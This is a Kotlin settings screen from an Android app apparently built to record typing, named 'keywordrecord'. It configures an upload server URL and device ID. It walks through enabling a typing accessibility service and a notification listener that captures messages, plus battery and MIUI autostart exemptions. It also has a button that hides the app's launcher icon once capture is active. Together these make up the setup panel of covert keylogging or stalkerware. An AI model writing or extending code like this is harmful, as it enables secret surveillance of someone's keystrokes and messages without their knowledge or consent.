package com.keywordrecord.keyboard

import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.NotificationManagerCompat

class SettingsActivity : AppCompatActivity() {

    private lateinit var apiClient: ApiClient
    private lateinit var accessibilityStatusText: TextView
    private lateinit var notificationStatusText: TextView
    private lateinit var hideAppButton: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_settings)

        apiClient = ApiClient(this)
        val deviceId = DeviceIdManager.getDeviceUniqueId(this)

        val deviceIdText = findViewById<TextView>(R.id.txt_device_id)
        val serverUrlInput = findViewById<EditText>(R.id.input_server_url)
        val saveButton = findViewById<Button>(R.id.btn_save)
        val testButton = findViewById<Button>(R.id.btn_test_connection)
        accessibilityStatusText = findViewById(R.id.txt_accessibility_status)
        notificationStatusText = findViewById(R.id.txt_notification_status)
        hideAppButton = findViewById(R.id.btn_hide_app)

        deviceIdText.text = getString(R.string.device_id_label, deviceId)
        serverUrlInput.setText(apiClient.getServerUrl())

        testButton.setOnClickListener {
            val url = serverUrlInput.text.toString().trim()
            if (url.isEmpty()) {
                serverUrlInput.error = getString(R.string.invalid_url)
                return@setOnClickListener
            }

            testButton.isEnabled = false
            apiClient.testConnection(url) { success, _ ->
                runOnUiThread {
                    testButton.isEnabled = true
                    Toast.makeText(
                        this,
                        if (success) getString(R.string.connection_ok)
                        else getString(R.string.connection_failed),
                        Toast.LENGTH_LONG
                    ).show()
                }
            }
        }

        saveButton.setOnClickListener {
            val url = serverUrlInput.text.toString().trim()
            if (!url.startsWith("http://") && !url.startsWith("https://")) {
                serverUrlInput.error = getString(R.string.invalid_url)
                return@setOnClickListener
            }

            apiClient.saveServerUrl(url)
            serverUrlInput.error = null
            Toast.makeText(this, getString(R.string.settings_saved), Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btn_enable_accessibility).setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }

        findViewById<Button>(R.id.btn_battery_settings).setOnClickListener {
            requestBatteryOptimizationExemption()
        }

        findViewById<Button>(R.id.btn_miui_settings).setOnClickListener {
            openMiuiSettings()
        }

        findViewById<Button>(R.id.btn_enable_notifications).setOnClickListener {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }

        hideAppButton.setOnClickListener {
            toggleLauncherVisibility()
        }

        findViewById<TextView>(R.id.txt_instructions).text = getString(R.string.setup_instructions)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (!NotificationManagerCompat.from(this).areNotificationsEnabled()) {
                requestPermissions(arrayOf(android.Manifest.permission.POST_NOTIFICATIONS), 100)
            }
        }
    }

    override fun onResume() {
        super.onResume()
        updateAccessibilityStatus()
        updateNotificationStatus()
        updateHideButton()
    }

    private fun updateHideButton() {
        val hidden = LauncherHelper.isLauncherHidden(this)
        hideAppButton.text = if (hidden) {
            getString(R.string.show_app_icon)
        } else {
            getString(R.string.hide_app_icon)
        }
    }

    private fun toggleLauncherVisibility() {
        val hidden = LauncherHelper.isLauncherHidden(this)
        if (hidden) {
            LauncherHelper.setLauncherHidden(this, false)
            Toast.makeText(this, getString(R.string.app_icon_shown), Toast.LENGTH_LONG).show()
        } else {
            if (!TypingAccessibilityService.isEnabled(this)) {
                Toast.makeText(this, getString(R.string.accessibility_disabled), Toast.LENGTH_LONG).show()
                return
            }
            LauncherHelper.setLauncherHidden(this, true)
            Toast.makeText(this, getString(R.string.app_icon_hidden), Toast.LENGTH_LONG).show()
        }
        updateHideButton()
    }

    private fun updateAccessibilityStatus() {
        val accessibilityOn = TypingAccessibilityService.isEnabled(this)
        val batteryOk = isBatteryOptimizationDisabled()

        accessibilityStatusText.text = when {
            accessibilityOn && batteryOk -> getString(R.string.accessibility_enabled)
            accessibilityOn -> getString(R.string.accessibility_enabled) + "\n" + getString(R.string.disable_battery_optimization)
            else -> getString(R.string.accessibility_disabled)
        }
    }

    private fun updateNotificationStatus() {
        notificationStatusText.text = if (MessageNotificationService.isEnabled(this)) {
            getString(R.string.notification_access_enabled)
        } else {
            getString(R.string.notification_access_disabled)
        }
    }

    private fun isBatteryOptimizationDisabled(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        return powerManager.isIgnoringBatteryOptimizations(packageName)
    }

    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            Toast.makeText(this, getString(R.string.battery_optimization_ok), Toast.LENGTH_SHORT).show()
            return
        }

        if (isBatteryOptimizationDisabled()) {
            Toast.makeText(this, getString(R.string.battery_optimization_ok), Toast.LENGTH_SHORT).show()
            return
        }

        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
            data = Uri.parse("package:$packageName")
        }
        try {
            startActivity(intent)
        } catch (_: Exception) {
            startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
        }
    }

    private fun openMiuiSettings() {
        val intents = listOf(
            Intent().setComponent(
                ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity"
                )
            ),
            Intent().setComponent(
                ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.powercenter.PowerSettings"
                )
            ),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
            }
        )

        for (intent in intents) {
            try {
                startActivity(intent)
                Toast.makeText(this, getString(R.string.miui_settings_opened), Toast.LENGTH_LONG).show()
                return
            } catch (_: Exception) {
            }
        }

        startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.parse("package:$packageName")
        })
    }
}
